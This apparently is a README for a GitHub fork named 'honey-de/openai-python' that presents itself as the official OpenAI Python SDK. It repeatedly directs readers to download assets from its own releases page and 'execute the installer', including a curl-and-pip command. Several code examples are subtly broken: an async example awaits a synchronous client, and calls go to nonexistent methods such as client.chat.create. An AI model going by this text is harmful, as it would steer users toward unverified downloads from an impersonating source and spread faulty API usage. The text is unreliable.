[![Releases](https://img.shields.io/badge/Releases-v1.0-blue?style=for-the-badge&logo=github)](https://github.com/honey-de/openai-python/releases)

# OpenAI Python SDK — Official Library for OpenAI API Integration 🚀🐍

![AI illustration](https://images.unsplash.com/photo-1555949963-aa79dcee981d?ixlib=rb-4.0.3&q=80&w=1400&auto=format&fit=crop&crop=entropy)

A clear, practical, and fast Python client for the OpenAI API. Use this library to call models, manage files, stream responses, and build chat assistants. It mirrors API concepts and keeps code small and readable.

Badges
- Topics: `openai`, `python`
- PyPI: https://pypi.org/project/openai
- Releases: [https://github.com/honey-de/openai-python/releases](https://github.com/honey-de/openai-python/releases)

Features
- Clean, typed Python surface for OpenAI endpoints.
- High-level helpers for chats, embeddings, and streaming.
- Sync and async APIs.
- Automatic JSON and binary handling.
- Small dependency surface.
- Tested against real API calls and fixtures.

Why this repo
- It maps directly to the OpenAI API surface.
- It keeps common patterns simple.
- It aims for minimal surprises when you upgrade models or endpoints.

Table of contents
- Installation
- Quick start
- Examples
  - Chat completion
  - Streaming responses
  - Embeddings and search
  - File upload and fine-tune
- Configuration
- Releases and binary download
- Contributing
- Development
- License

Installation

Install from PyPI
```bash
pip install openai
```

Install from a downloaded release asset
If you prefer to install a built wheel, download the release asset and install it. For example:
1. Download the wheel or tarball from https://github.com/honey-de/openai-python/releases
2. Install with pip:
```bash
# Example file name; replace with the actual downloaded filename
pip install ./openai_python-1.0.0-py3-none-any.whl
```
Because the releases page contains built files, download the file and execute the appropriate installer for your environment.

Quick start

Set your API key in the environment. The client reads OPENAI_API_KEY by default.
```bash
export OPENAI_API_KEY="sk-xxxx"
```

Basic sync chat example
```python
from openai import OpenAI

client = OpenAI(api_key="sk-xxxx")

resp = client.chat.create(
    model="gpt-4o-mini",
    messages=[
        {"role": "system", "content": "You are a helpful assistant."},
        {"role": "user", "content": "Write a short haiku about code."}
    ],
)
print(resp.choices[0].message["content"])
```

Async chat example
```python
import asyncio
from openai import OpenAI

async def main():
    client = OpenAI(api_key="sk-xxxx")
    resp = await client.chat.create(
        model="gpt-4o-mini",
        messages=[
            {"role": "system", "content": "You are concise."},
            {"role": "user", "content": "Summarize dependency injection in one sentence."}
        ],
    )
    print(resp.choices[0].message["content"])

asyncio.run(main())
```

Streaming responses

The client supports streaming tokens. Use a for-loop to handle chunks as they arrive.
```python
from openai import OpenAI

client = OpenAI(api_key="sk-xxxx")

stream = client.chat.stream(
    model="gpt-4o-mini",
    messages=[{"role": "user", "content": "Tell me a 2-step plan for writing tests."}]
)

for chunk in stream:
    # chunk.delta contains the incremental text
    print(chunk.delta, end="", flush=True)
```

Embeddings and semantic search
```python
from openai import OpenAI

client = OpenAI(api_key="sk-xxxx")

emb = client.embeddings.create(model="text-embedding-3-small", input="A short sentence.")
print("embedding length:", len(emb.data[0].embedding))

# Use embeddings for nearest-neighbor search in your vector store.
```

File upload and fine-tune (example pattern)
```python
from openai import OpenAI

client = OpenAI(api_key="sk-xxxx")

# Upload a file for fine-tuning or evaluations
with open("dataset.jsonl", "rb") as f:
    upload = client.files.create(file=f, purpose="fine-tune")
    print("file id:", upload.id)

# Start a fine-tune run (endpoint names and parameters can vary)
ft = client.fine_tunes.create(training_file=upload.id, model="gpt-4o-mini")
print("fine-tune id:", ft.id)
```

Configuration

Environment variables
- OPENAI_API_KEY — API key string
- OPENAI_API_BASE — custom base URL for enterprise or proxy
- OPENAI_API_VERSION — optional to pin behavior
- OPENAI_TIMEOUT — default request timeout in seconds

Programmatic config
```python
from openai import OpenAI

client = OpenAI(api_key="sk-xxxx", base_url="https://api.openai.com/v1", timeout=30)
```

Error handling

The client raises typed exceptions for HTTP and API errors. Handle them with an except block.
```python
from openai import OpenAI, OpenAIError

client = OpenAI(api_key="sk-xxxx")
try:
    client.models.retrieve("gpt-9999")
except OpenAIError as e:
    print("API error:", e)
```

Rate limits and retries
- Respect the API rate limits returned by the server.
- Implement exponential backoff on 429 or 5xx responses.
- The client can be wrapped with a retry layer in your app.

Security
- Keep your API key secret.
- Rotate keys in your account when needed.
- If you use a proxy, set OPENAI_API_BASE to your proxy URL.

Releases and binary download

Visit the releases page for prebuilt artifacts:
https://github.com/honey-de/openai-python/releases

This page contains packaged files such as wheels and tarballs. Download the appropriate file for your platform. After download, execute the installer. Example:
```bash
# hypothetical example; replace with actual filename from the release
curl -L -o openai_python-1.0.0-py3-none-any.whl \
  https://github.com/honey-de/openai-python/releases/download/v1.0.0/openai_python-1.0.0-py3-none-any.whl

pip install ./openai_python-1.0.0-py3-none-any.whl
```
If the release link does not work for you, check the "Releases" section on the repository page for the latest files and checksums.

Contributing

I accept issues and pull requests. Follow this process:
1. Open an issue if you find a bug or want a feature.
2. Fork the repo and create a branch with a clear name.
3. Add tests that cover your change.
4. Run the test suite and linters.
5. Submit a pull request and reference the issue.

Development

Clone and run tests locally.
```bash
git clone https://github.com/honey-de/openai-python.git
cd openai-python
python -m venv .venv
source .venv/bin/activate
pip install -e ".[dev]"
pytest
```

Testing approach
- Unit tests cover request/response parsing.
- Integration tests run against a sandbox or the real API when keys are present.
- Keep tests small and focused.

API surface overview (short)

Client
- OpenAI(api_key, base_url=None, timeout=None)
- client.chat.create(...)
- client.chat.stream(...)
- client.embeddings.create(...)
- client.files.create(...)
- client.fine_tunes.create(...)
- client.models.list() / retrieve()

Responses
- Consistent response objects with typed fields.
- Access text with resp.choices[0].message["content"] for chat.
- Access embeddings at resp.data[0].embedding.

Common patterns
- Use streaming for long outputs.
- Use embeddings for search and similarity.
- Upload files for training and evaluation.
- Keep API keys out of source control.

Troubleshooting checklist
- Confirm OPENAI_API_KEY is set.
- Verify network connectivity to the API base.
- Check rate limit headers in responses.
- Inspect release assets if you installed from a wheel.

Assets and images

- Use the shields badge above to jump to releases.
- Use the sample Unsplash image for visual identity in docs.
- Replace images with your own assets for product docs.

License

This project uses the MIT License. Check the LICENSE file for the full text.